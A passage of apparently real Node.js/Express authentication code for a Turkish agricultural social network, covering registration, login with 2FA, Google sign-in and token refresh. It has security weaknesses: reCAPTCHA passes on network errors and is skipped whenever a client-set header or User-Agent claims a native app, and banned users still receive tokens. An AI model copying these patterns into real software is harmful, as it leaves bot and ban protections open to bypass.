        console.warn('[reCAPTCHA] Token boş');
        return { success: false, error: 'reCAPTCHA doğrulaması gerekli' };
    }
    
    console.log('[reCAPTCHA] Token var, Google API çağrılıyor...', token.substring(0, 20) + '...');
    try {
        const { default: fetch } = await import('node-fetch');
        const params = new URLSearchParams({
            secret  : process.env.RECAPTCHA_SECRET_KEY,
            response: token,
        });
        if (remoteip) params.append('remoteip', remoteip);
        
        console.log('[reCAPTCHA] POST → https://www.google.com/recaptcha/api/siteverify');
        const res = await fetch('https://www.google.com/recaptcha/api/siteverify', {
            method : 'POST',
            body   : params,
            signal : AbortSignal.timeout(8000),
        });
        console.log('[reCAPTCHA] HTTP Status:', res.status);
        
        const data = await res.json();
        console.log('[reCAPTCHA] API Response:', JSON.stringify(data));
        
        if (!data.success) {
            console.warn('[reCAPTCHA] ❌ Başarısız - error-codes:', data['error-codes']);
            return { success: false, error: 'reCAPTCHA doğrulaması başarısız. Lütfen tekrar deneyin.' };
        }
        console.log('[reCAPTCHA] ✅ Doğrulama başarılı!');
        return { success: true };
    } catch (e) {
        console.error('[reCAPTCHA] Exception:', e.message);
        // Servis erişilemiyorsa geçir (availability öncelikli)
        return { success: true, skipped: true };
    }
}

// ── Native uygulama tespiti ──────────────────────────────────────────
// Android OkHttp User-Agent veya özel X-App-Platform header'ı ile tespit edilir
function isNativeAppRequest(req) {
    const ua = (req.headers['user-agent'] || '').toLowerCase();
    const platform = (req.headers['x-app-platform'] || '').toLowerCase();
    const clientType = (req.headers['x-client-type'] || '').toLowerCase();
    return (
        platform === 'android' ||
        platform === 'ios' ||
        clientType === 'native' ||
        ua.includes('okhttp') ||       // Retrofit/OkHttp (Android)
        ua.includes('agrolink-android') // Özel Android UA
    );
}

// Middleware — req.body.recaptchaToken veya req.body['g-recaptcha-response'] kontrol eder
// 🔒 Native mobil uygulama isteklerinde reCAPTCHA ATLANIR (sadece web'de çalışır)
async function recaptchaMiddleware(req, res, next) {
    // Native app'ten gelen isteklerde reCAPTCHA kontrolü yok
    if (isNativeAppRequest(req)) {
        console.log('[reCAPTCHA] Native uygulama isteği — atlanıyor');
        return next();
    }
    const token = req.body?.recaptchaToken || req.body?.['g-recaptcha-response'];
    const result = await verifyRecaptcha(token, req.ip);
    if (!result.success) {
        return res.status(400).json({ error: result.error || 'reCAPTCHA doğrulaması başarısız' });
    }
    next();
}

// ─── 2. KAYIT ───────────────────────────────────────────────────────
app.post('/api/auth/register', registerLimiter, validateAuthInput, upload.single('profilePic'), async (req, res) => {
    try {
        const { name, username, email, password, userType } = req.body;
        if (!name || !username || !email || !password) {
            return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        }
        // 🔒 GÜVENLİK: Minimum 8 karakter (NIST SP 800-63B)
        if (password.length < 8) return res.status(400).json({ error: 'Şifre en az 8 karakter olmalıdır' });

        const cleanUsername = username.toLowerCase().replace(/[^a-z0-9._-]/g, '');
        const cleanEmail = email.toLowerCase().trim();

        const existing = await dbGet('SELECT id FROM users WHERE username = $1', [cleanUsername]);
        if (existing) return res.status(400).json({ error: 'Bu kullanıcı adı alınmış' });

        // Aynı e-posta ile birden fazla hesap açılabilir — kullanıcı adı benzersiz olmalı
        const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const userId = uuidv4();

        let profilePic = null;
        if (req.file) {
            // 🔒 Magic bytes + boyut doğrulama (profilePic: max 5 MB)
            try { await verifyUploadedFile(req.file, 'profilePic'); }
            catch (verifyErr) { return res.status(400).json({ error: verifyErr.message }); }
            const filename = `profile_${userId}.webp`;
            const outputPath = path.join(profilesDir, filename);
            try {
                await processImage(req.file.path, outputPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                profilePic = `/uploads/profiles/${filename}`;
            } catch (e) {
                console.error('Profil resmi işleme hatası'); // 🔒 Detay loglanmıyor
            }
            await fs.unlink(req.file.path).catch(() => {});
        }

        const validUserTypes = ['tarim_ogretmeni', 'tarim_ogrencisi', 'ogretmen', 'ziraat_muhendisi', 'normal_kullanici', 'ciftci_hayvancilik'];
        const finalUserType = validUserTypes.includes(userType) ? userType : 'normal_kullanici';

        await dbRun(
            `INSERT INTO users (id, name, username, email, password, "profilePic", "userType", "registrationIp", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW(), NOW())`,
            [userId, name, cleanUsername, cleanEmail, hashedPassword, profilePic, finalUserType, req.ip]
        );

        const tokens = generateTokens({ id: userId, email: cleanEmail, username: cleanUsername, role: 'user' });

        // 🌾 Yeni kullanıcı varsayılan hesapları takip etsin
        try {
            const defaultAccounts = ['agro_sosyal', 'agrolink_news', 'yemektarifleri', 'agroabot', 'akilli.tarlam'];
            for (const uname of defaultAccounts) {
                const acc = await dbGet('SELECT id FROM users WHERE username = $1', [uname]);
                if (acc) {
                    await dbRun(
                        'INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING',
                        [uuidv4(), userId, acc.id]
                    );
                }
            }
        } catch (followErr) {
            console.warn('⚠️ Otomatik takip hatası:', followErr.message);
        }

        // 📧 Hoş geldiniz + e-posta doğrulama kodu gönder
        const verifyCode    = crypto.randomInt(100000, 999999).toString();
        
        await dbRun(
            `INSERT INTO email_verifications (id, "userId", email, code, "expiresAt") VALUES ($1, $2, $3, $4, NOW() + INTERVAL '15 minutes')`,
            [uuidv4(), userId, cleanEmail, verifyCode]
        );
        if (isGmailAddress(cleanEmail)) sendWelcomeEmail(cleanEmail, name).catch(() => {});

        // Doğrulama kodu içeren ayrı e-posta (sadece gmail)
        sendEmailIfGmail(cleanEmail, '🌾 Agrolink — E-posta Doğrulama Kodunuz', `
<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><style>
body{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;padding:0}
.container{max-width:600px;margin:20px auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.1)}
.header{background:linear-gradient(135deg,#2e7d32,#4caf50);padding:40px 30px;text-align:center}
.header h1{color:#fff;margin:0;font-size:28px}
.header p{color:rgba(255,255,255,.9);margin:10px 0 0;font-size:16px}
.content{padding:40px 30px}
.code-box{background:#2e7d32;color:#fff;font-size:40px;font-weight:bold;text-align:center;padding:25px;border-radius:10px;letter-spacing:12px;margin:25px 0}
.info{background:#e8f5e9;padding:20px;border-radius:8px;border-left:4px solid #4caf50}
.footer{background:#f5f5f5;padding:25px 30px;text-align:center;color:#666;font-size:13px}
</style></head><body>
<div class="container">
  <div class="header"><h1>🌾 E-posta Doğrulama</h1><p>Hesabınızı doğrulamak için aşağıdaki kodu kullanın</p></div>
  <div class="content">
    <h2 style="color:#2e7d32">Merhaba ${name},</h2>
    <p>Agrolink hesabınızı oluşturduğunuz için teşekkür ederiz. Hesabınızı aktif etmek için aşağıdaki doğrulama kodunu kullanın:</p>
    <div class="code-box">${verifyCode}</div>
    <div class="info"><strong>⏱️ Bu kod 15 dakika geçerlidir.</strong><br>Kodu kimseyle paylaşmayın.</div>
    <p style="margin-top:25px">Bu işlemi siz yapmadıysanız bu e-postayı dikkate almayın.</p>
    <p>Saygılarımızla,<br><strong>Agrolink Ekibi</strong></p>
  </div>
  <div class="footer"><p>Bu e-posta otomatik gönderilmiştir. &copy; ${new Date().getFullYear()} Agrolink</p></div>
</div></body></html>`).catch(() => {});

        res.status(201).json({
            message: 'Hesap oluşturuldu',
            token: tokens.accessToken,
            refreshToken: tokens.refreshToken,
            emailVerificationRequired: true,
            user: { id: userId, username: cleanUsername, name, email: cleanEmail, profilePic: absoluteUrl(profilePic) }
        });
    } catch (error) {
        console.error('Kayıt hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 2b. KAYIT (register-init alias — UI uyumluluğu için) ──────────
// UI /api/auth/register-init çağırıyor, bu endpoint aynı işlemi yapar
app.post('/api/auth/register-init', registerLimiter, recaptchaMiddleware, upload.single('profilePic'), async (req, res) => {
    try {
        const { name, username, email, password, userType } = req.body;
        if (!name || !username || !email || !password) {
            return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        }
        if (password.length < 8) return res.status(400).json({ error: 'Şifre en az 8 karakter olmalıdır' });

        const cleanUsername = username.toLowerCase().replace(/[^a-z0-9._-]/g, '');
        const cleanEmail = email.toLowerCase().trim();

        // Sadece kullanıcı adı benzersiz olmalı — aynı e-posta ile birden fazla hesap açılabilir
        const existing = await dbGet('SELECT id FROM users WHERE username = $1', [cleanUsername]);
        if (existing) return res.status(400).json({ error: 'Bu kullanıcı adı alınmış' });

        const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const userId = uuidv4();

        let profilePic = null;
        if (req.file) {
            // 🔒 Magic bytes + boyut doğrulama (profilePic: max 5 MB)
            try { await verifyUploadedFile(req.file, 'profilePic'); }
            catch (verifyErr) { return res.status(400).json({ error: verifyErr.message }); }
            const filename = `profile_${userId}.webp`;
            const outputPath = path.join(profilesDir, filename);
            try {
                await processImage(req.file.path, outputPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                profilePic = `/uploads/profiles/${filename}`;
            } catch (e) {
                console.error('Profil resmi işleme hatası'); // 🔒 Detay loglanmıyor
            }
            await fs.unlink(req.file.path).catch(() => {});
        }

        const validUserTypes = ['tarim_ogretmeni', 'tarim_ogrencisi', 'ogretmen', 'ziraat_muhendisi', 'normal_kullanici', 'ciftci_hayvancilik'];
        const finalUserType = validUserTypes.includes(userType) ? userType : 'normal_kullanici';

        await dbRun(
            `INSERT INTO users (id, name, username, email, password, "profilePic", "userType", "registrationIp", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW(), NOW())`,
            [userId, name, cleanUsername, cleanEmail, hashedPassword, profilePic, finalUserType, req.ip]
        );

        // 🌾 Yeni kullanıcı varsayılan hesapları takip etsin
        try {
            const defaultAccounts = ['agro_sosyal', 'agrolink_news', 'yemektarifleri', 'agroabot', 'akilli.tarlam'];
            for (const uname of defaultAccounts) {
                const acc = await dbGet('SELECT id FROM users WHERE username = $1', [uname]);
                if (acc) {
                    await dbRun(
                        'INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING',
                        [uuidv4(), userId, acc.id]
                    );
                }
            }
        } catch (followErr) {
            console.warn('⚠️ Otomatik takip hatası:', followErr.message);
        }

        // E-posta doğrulama kodu oluştur
        const verifyCode    = crypto.randomInt(100000, 999999).toString();
        
        await dbRun(
            `INSERT INTO email_verifications (id, "userId", email, code, "expiresAt") VALUES ($1, $2, $3, $4, NOW() + INTERVAL '15 minutes')`,
            [uuidv4(), userId, cleanEmail, verifyCode]
        );

        // Doğrulama kodu e-postası - tam HTML şablonuyla
        // Sadece @gmail.com adreslerine doğrulama maili gönder
        const emailResult = isGmailAddress(cleanEmail)
            ? await sendEmailVerificationCode(cleanEmail, name.trim(), verifyCode)
            : { success: true, skipped: true };

        if (!emailResult.success && !emailResult.skipped) {
            // Gmail adresi ama gönderim başarısız → yine de devam et, kullanıcıyı bloke etme
            console.warn('⚠️ Kayıt doğrulama e-postası gönderilemedi (kayıt yine de tamamlandı):', emailResult.error);
        }

        console.log(`📧 Kayıt doğrulama kodu gönderildi: [e-posta gizlendi]`);

        // Hoş geldiniz emaili arka planda gönder (sadece gmail)
        if (isGmailAddress(cleanEmail)) sendWelcomeEmail(cleanEmail, name).catch(() => {});

        res.status(201).json({
            message: 'Doğrulama kodu e-posta adresinize gönderildi. Lütfen kodu girerek kaydınızı tamamlayın.',
            emailVerificationRequired: true,
            requiresVerification: true,
            email: cleanEmail,
            userId,
            profilePic: absoluteUrl(profilePic),
        });
    } catch (error) {
        console.error('Kayıt (init) hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 3. GİRİŞ ──────────────────────────────────────────────────────
app.post('/api/auth/login', loginLimiter, validateAuthInput, recaptchaMiddleware, async (req, res) => {
    try {
        const { email, password, identifier } = req.body;
        // UI'dan "identifier" (e-posta veya kullanıcı adı) gelebilir, geriye dönük uyumluluk için "email" de desteklenir
        const loginId = (identifier || email || '').toLowerCase().trim();
        if (!loginId || !password) return res.status(400).json({ error: 'E-posta/kullanıcı adı ve şifre gerekli' });

        // ✅ IP bazlı brute-force (HYDRA koruması)
        const loginIp = (req.ip || req.connection?.remoteAddress || '').replace(/^::ffff:/, '');

        const user = await dbGet(
            `SELECT id, username, name, email, password, role, plan,
                    "profilePic", "coverPic", bio, "isVerified", "isActive",
                    "isBanned", "emailVerified", "twoFactorEnabled",
                    "hasFarmerBadge", "userType", "lastLogin", "registrationIp"
             FROM users WHERE (email = $1 OR username = $1) AND "isActive" = TRUE`,
            [loginId]
        );
        // 🔒 Timing Oracle Koruması: Kullanıcı yoksa bile bcrypt çalıştır
        // Böylece "user yok" ve "şifre yanlış" yanıt süreleri eşitlenir
        const DUMMY_HASH = '$2b$10$abcdefghijklmnopqrstuuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
        if (!user) {
            await bcrypt.compare(password, DUMMY_HASH); // Sahte gecikme — timing oracle önlemi
            recordFailedLogin(loginId);
            return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        }

        // 🔒 Brute force kontrolü
        const lockout = checkAccountLockout(loginId);
        if (lockout.locked) {
            return res.status(429).json({ error: `Hesap geçici olarak kilitlendi. ${lockout.remainingMin} dakika sonra tekrar deneyin.` });
        }

        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            recordFailedLogin(loginId);
            return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        }
        clearFailedLogins(loginId);

        // 🔒 BAN KONTROLÜ — Banlı kullanıcı login olabilir ama isBanned:true ile bilgilendirilir
        // Frontend bu flag'i alınca profili 3 sn gösterir sonra erişim engeli modal açar
        if (user.isBanned) {
            const tokens = generateTokens(user);
            const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
            await dbRun(
                `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
                 VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '365 days')`,
                [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
            );
            const csrfToken = generateCsrfToken();
            setAuthCookies(res, req, tokens);
            setCsrfCookie(res, req, csrfToken);
            return res.json({
                message: 'Giriş başarılı',
                token: tokens.accessToken,
                refreshToken: tokens.refreshToken,
                isBanned: true,
                user: {
                    id: user.id, username: user.username, name: user.name, email: user.email,
                    profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic),
                    bio: user.bio, isVerified: user.isVerified, hasFarmerBadge: user.hasFarmerBadge,
                    role: user.role, isBanned: true
                }
            });
        }

        // ========== 2FA KONTROLÜ ==========
        if (user.twoFactorEnabled) {
            // 2FA açık → kod oluştur ve gönder
            const twoFACode = crypto.randomInt(100000, 999999).toString();
            // ✅ DÜZELTME: PostgreSQL NOW()+INTERVAL kullan (timezone farkından etkilenmez)

            // Eski kullanılmamış kodları temizle
            await dbRun(
                `UPDATE two_factor_codes SET used = TRUE WHERE "userId" = $1 AND used = FALSE`,
                [user.id]
            );

            // Yeni kodu kaydet
            await dbRun(
                `INSERT INTO two_factor_codes (id, "userId", code, purpose, "expiresAt", used, "createdAt")
                 VALUES ($1, $2, $3, $4, NOW() + INTERVAL '5 minutes', FALSE, NOW())`,
                [uuidv4(), user.id, twoFACode, 'login']
            );

            // 2FA kodunu e-posta ile gönder (tam HTML şablonuyla)
            const emailResult = await sendTwoFactorCodeEmail(user.email, user.name, twoFACode, 'login');

            if (!emailResult.success && !emailResult.skipped) {
                // Gerçek gönderim hatası — gmail adresi ama mail gitmedi
                console.error('❌ 2FA e-postası gönderilemedi:', emailResult.error);
                return res.status(500).json({ error: 'Doğrulama kodu gönderilemedi. Lütfen tekrar deneyin.' });
            }

            if (emailResult.skipped) {
                console.log(`ℹ️  2FA kodu oluşturuldu ama e-posta gönderilmedi (gmail değil): [gizlendi]`);
            } else {
                console.log(`🔐 2FA kodu gönderildi: [e-posta gizlendi]`);
            }

            // Geçici token oluştur (2FA doğrulama için)
            const tempToken = jwt.sign(
                { id: user.id, email: user.email, username: user.username, pending2FA: true },
                JWT_SECRET,
                { expiresIn: '10m', algorithm: 'HS256' }
            );

            return res.json({
                requires2FA: true,
                tempToken,
                userId: user.id,
                email: user.email,
                message: 'Doğrulama kodu e-posta adresinize gönderildi. Lütfen 6 haneli kodu girin.'
            });
        }

        // 2FA kapalı → direkt giriş yap
        // 📧 Giriş bildirimi e-postası (arka planda)
        sendLoginNotificationEmail(user.email, user.name, req).catch(() => {});

        await dbRun('UPDATE users SET "lastLogin" = NOW(), "isOnline" = TRUE, "updatedAt" = NOW() WHERE id = $1', [user.id]);
        // 📊 Giriş saati kaydı — akıllı bildirim zamanlama için
        dbRun(`INSERT INTO user_login_hours ("userId", hour) VALUES ($1, $2)`,
            [user.id, new Date().getHours()]).catch(() => {});

        await dbRun(
            `INSERT INTO login_history (id, "userId", ip, "userAgent", "createdAt")
             VALUES ($1, $2, $3, $4, NOW())`,
            [uuidv4(), user.id, req.ip, req.headers['user-agent'] || '']
        );

        const tokens = generateTokens(user);

        const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '365 days')`,
            [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
        );

        // 🔒 Güvenli cookie + CSRF token (setAuthCookies: path, maxAge, secure düzeltildi)
        const csrfToken = generateCsrfToken();
        setAuthCookies(res, req, tokens);
        setCsrfCookie(res, req, csrfToken);

        res.json({
            message: 'Giriş başarılı',
            token: tokens.accessToken,       // backward compat (mobile/native)
            // 🔒 Mobile backward compat: cookie'yi okuyamayan native app için
            // Tarayıcı istemcileri için HttpOnly cookie kullanın
            refreshToken: tokens.refreshToken,
            user: {
                id: user.id, username: user.username, name: user.name, email: user.email,
                profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic), bio: user.bio,
                isVerified: user.isVerified, hasFarmerBadge: user.hasFarmerBadge, role: user.role
            }
        });
    } catch (error) {
        console.error('Giriş hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ════════════════════════════════════════════════════════════════════
// 🔐 GOOGLE İLE GİRİŞ YAP — OAuth 2.0 / Google Identity Services
// ════════════════════════════════════════════════════════════════════
//
// .env dosyasına ekle:
//   GOOGLE_WEB_CLIENT_ID=<Web OAuth 2.0 Client ID>
//   GOOGLE_ANDROID_CLIENT_ID=<Android OAuth 2.0 Client ID>
//
// Web frontend: google.accounts.id.initialize({ client_id, callback })
//   → callback'den gelen credential (idToken) → /api/auth/google'a POST
// Android: GoogleSignIn SDK → getIdToken() → /api/auth/google'a POST
//
// Kurulum: npm install google-auth-library
// ════════════════════════════════════════════════════════════════════
let GoogleOAuth2Client = null;
try {
    const { OAuth2Client } = require('google-auth-library');
    GoogleOAuth2Client = OAuth2Client;
    console.log('✅ google-auth-library yüklendi — Google Sign-In aktif');
} catch (_) {
    console.warn('⚠️  google-auth-library bulunamadı. (npm install google-auth-library)');
}

async function verifyGoogleIdToken(idToken) {
    if (!GoogleOAuth2Client) throw new Error('google-auth-library kurulu değil');
    const webClientId     = process.env.GOOGLE_WEB_CLIENT_ID;
    const androidClientId = process.env.GOOGLE_ANDROID_CLIENT_ID;
    if (!webClientId && !androidClientId) {
        throw new Error('GOOGLE_WEB_CLIENT_ID veya GOOGLE_ANDROID_CLIENT_ID .env\'de tanımlı değil');
    }
    const audiences = [webClientId, androidClientId].filter(Boolean);
    const client    = new GoogleOAuth2Client(webClientId || androidClientId);
    const ticket    = await client.verifyIdToken({ idToken, audience: audiences });
    const payload   = ticket.getPayload();
    if (!payload?.email)        throw new Error('Google token\'dan e-posta alınamadı');
    if (!payload.email_verified) throw new Error('Google e-postası doğrulanmamış');
    return {
        googleId: payload.sub,
        email   : payload.email.toLowerCase().trim(),
        name    : payload.name || payload.email.split('@')[0],
        picture : payload.picture || null,
    };
}

// POST /api/auth/google
// Body: { idToken: "<google_id_token>" }
app.post('/api/auth/google', loginLimiter, async (req, res) => {
    try {
        if (!GoogleOAuth2Client) {
            return res.status(503).json({ error: 'Google Sign-In şu anda kullanılamıyor. Sunucu yapılandırması eksik.' });
        }

        const { idToken } = req.body;
        if (!idToken) return res.status(400).json({ error: 'Google ID Token gerekli' });

        // ── Google token doğrula ──────────────────────────────────────
        let googleUser;
        try {
            googleUser = await verifyGoogleIdToken(idToken);
        } catch (e) {
            console.warn('[Google Auth] Token doğrulama başarısız:', e.message);
            return res.status(401).json({ error: 'Geçersiz Google token. Lütfen tekrar deneyin.' });
        }

        const { googleId, email, name, picture } = googleUser;

        // ── Kullanıcıyı bul (googleId veya email ile) ─────────────────
        let user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "isBanned", "emailVerified",
                    "hasFarmerBadge", "userType", "twoFactorEnabled", "googleId"
             FROM users
             WHERE ("googleId" = $1 OR email = $2) AND "isActive" = TRUE
             LIMIT 1`,
            [googleId, email]
        );

        let isNewUser = false;

        if (!user) {
            // ── Yeni kullanıcı: otomatik kayıt ───────────────────────
            isNewUser       = true;
            const newUserId = uuidv4();

            // Kullanıcı adı üret (e-posta prefix'inden)
            let baseUsername = email.split('@')[0].toLowerCase().replace(/[^a-z0-9._-]/g, '');
            if (baseUsername.length < 3) baseUsername = 'user' + baseUsername;
            let finalUsername = baseUsername;
            let suffix = 1;
            while (await dbGet('SELECT id FROM users WHERE username = $1', [finalUsername])) {
                finalUsername = `${baseUsername}${suffix++}`;
            }

            // Google profil fotoğrafını indir (başarısız olursa atla)
            let profilePic = null;
            if (picture) {
                try {
                    const { default: fetch } = await import('node-fetch');
                    const imgRes = await fetch(picture, { signal: AbortSignal.timeout(5000) });
                    if (imgRes.ok) {
                        const imgBuf  = Buffer.from(await imgRes.arrayBuffer());
                        const filename = `profile_${newUserId}.webp`;
                        const outPath  = path.join(profilesDir, filename);
                        await processImageBuffer(imgBuf, outPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                        profilePic = `/uploads/profiles/${filename}`;
                    }
                } catch (_) {}
            }

            await dbRun(
                `INSERT INTO users
                   (id, name, username, email, password, "profilePic", "userType",
                    "googleId", "emailVerified", "registrationIp", "createdAt", "updatedAt")
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,TRUE,$9,NOW(),NOW())`,
                [newUserId, name, finalUsername, email, '', profilePic, 'normal_kullanici', googleId, req.ip]
            );

            // Varsayılan hesapları takip ettir
            try {
                for (const uname of ['agro_sosyal','agrolink_news','yemektarifleri','agroabot','akilli.tarlam']) {
                    const acc = await dbGet('SELECT id FROM users WHERE username=$1', [uname]);
                    if (acc) await dbRun(
                        'INSERT INTO follows (id,"followerId","followingId","createdAt") VALUES($1,$2,$3,NOW()) ON CONFLICT ("followerId","followingId") DO NOTHING',
                        [uuidv4(), newUserId, acc.id]
                    );
                }
            } catch (_) {}

            if (isGmailAddress(email)) sendWelcomeEmail(email, name).catch(() => {});

            user = await dbGet(
                `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                        "isVerified", "isActive", "isBanned", "emailVerified",
                        "hasFarmerBadge", "userType", "twoFactorEnabled"
                 FROM users WHERE id=$1`,
                [newUserId]
            );
            console.log(`✅ [Google Auth] Yeni kullanıcı: ${maskEmail(email)}`);
        } else {
            // Mevcut kullanıcı — ban kontrolü
            if (user.isBanned) return res.status(403).json({ error: 'Hesabınız askıya alınmış.' });
            // googleId yoksa ilk Google girişi — ekle
            if (!user.googleId) {
                await dbRun(
                    `UPDATE users SET "googleId"=$1, "emailVerified"=TRUE, "updatedAt"=NOW() WHERE id=$2`,
                    [googleId, user.id]
                );
            }
        }

        // ── lastLogin güncelle ────────────────────────────────────────
        await dbRun('UPDATE users SET "lastLogin"=NOW(),"isOnline"=TRUE,"updatedAt"=NOW() WHERE id=$1', [user.id]);
        dbRun(`INSERT INTO user_login_hours ("userId",hour) VALUES($1,$2)`,
            [user.id, new Date().getHours()]).catch(() => {});

        // ── Token üret ────────────────────────────────────────────────
        const tokens    = generateTokens(user);
        const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id,"userId","tokenHash",ip,"userAgent","createdAt","expiresAt")
             VALUES($1,$2,$3,$4,$5,NOW(),NOW()+INTERVAL '365 days')`,
            [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
        );

        const csrfToken = generateCsrfToken();
        setAuthCookies(res, req, tokens);
        setCsrfCookie(res, req, csrfToken);

        console.log(`✅ [Google Auth] Giriş başarılı: ${maskEmail(email)}`);

        res.json({
            message     : 'Google ile giriş başarılı',
            token       : tokens.accessToken,
            refreshToken: tokens.refreshToken,
            isNewUser,
            user: {
                id            : user.id,
                username      : user.username,
                name          : user.name,
                email         : user.email,
                profilePic    : absoluteUrl(user.profilePic),
                coverPic      : absoluteUrl(user.coverPic),
                bio           : user.bio,
                isVerified    : user.isVerified,
                hasFarmerBadge: user.hasFarmerBadge,
                role          : user.role,
                emailVerified : true,
            }
        });
    } catch (error) {
        console.error('[Google Auth] Sunucu hatası:', error.message);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 4. TOKEN YENİLEME ──────────────────────────────────────────────
app.post('/api/auth/refresh', refreshLimiter, async (req, res) => {
    try {
        // 🔒 Önce HttpOnly cookie, sonra body (native/mobile uyumluluk)
        const refreshToken = req.cookies?.refresh_token || req.body?.refreshToken;
        if (!refreshToken) return res.status(401).json({ error: 'Refresh token gerekli' });

        const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);
        const tokenHash = crypto.createHash('sha256').update(refreshToken).digest('hex');

        const stored = await dbGet(
            `SELECT * FROM refresh_tokens WHERE "tokenHash" = $1 AND "isActive" = TRUE AND "expiresAt" > NOW()`,
            [tokenHash]
        );
        if (!stored) return res.status(403).json({ error: 'Geçersiz refresh token' });

        const user = await dbGet(
            // 🔒 Sadece whitelist alanlar
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) return res.status(403).json({ error: 'Kullanıcı bulunamadı' });

        // 🔒 Token Rotation: eski token geçersiz kıl, yeni token oluştur
        await dbRun('UPDATE refresh_tokens SET "isActive" = FALSE WHERE "tokenHash" = $1', [tokenHash]);

        const tokens = generateTokens(user);
        const newHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '365 days')`,
            [uuidv4(), user.id, newHash, req.ip, req.headers['user-agent'] || '']
        );

        // 🔒 setAuthCookies ile güvenli cookie set et (FORCE_SECURE_COOKIE destekli)
        setAuthCookies(res, req, tokens);

        res.json({ token: tokens.accessToken, refreshToken: tokens.refreshToken });
    } catch (error) {
        res.status(403).json({ error: 'Geçersiz token' });
    }
});

// ─── 5. MEVCUT KULLANICI BİLGİSİ ───────────────────────────────────
app.get('/api/me', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT id, username, name, email, "profilePic", "coverPic", bio, location, website,
                    "isVerified", "hasFarmerBadge", "userType", "createdAt", "lastLogin", "isOnline", role,
                    "farmerBadgeType", "farmerCertificate"
             FROM users WHERE id = $1`,
            [req.user.id]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        // Kesin sayım - COUNT sütun adını açıkça belirt
        const [followingRow, followerRow, postRow] = await Promise.all([
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followerId" = $1', [req.user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followingId" = $1', [req.user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM posts   WHERE "userId" = $1 AND "isActive" = TRUE', [req.user.id]),
        ]);

        const followingCount = followingRow.rows[0]?.cnt ?? 0;
        const followerCount  = followerRow.rows[0]?.cnt  ?? 0;
        const postCount      = postRow.rows[0]?.cnt      ?? 0;

        res.json({
            user: {
                ...user,
                profilePic: absoluteUrl(user.profilePic),
                coverPic: absoluteUrl(user.coverPic),
                followingCount,
                followerCount,
                postCount,
            }
        });
    } catch (error) {
        console.error('api/me hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── /api/auth/me ALIAS (/api/me ile aynı, Agro Dev HTML uyumu için) ──────
app.get('/api/auth/me', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT id, username, name, email, "profilePic", "coverPic", bio, location, website,
                    "isVerified", "hasFarmerBadge", "userType", "createdAt", "lastLogin", "isOnline", role, plan,
                    "farmerBadgeType", "farmerCertificate"
             FROM users WHERE id = $1`,
            [req.user.id]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        res.json({ user: { ...user, profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic) } });
    } catch (e) {
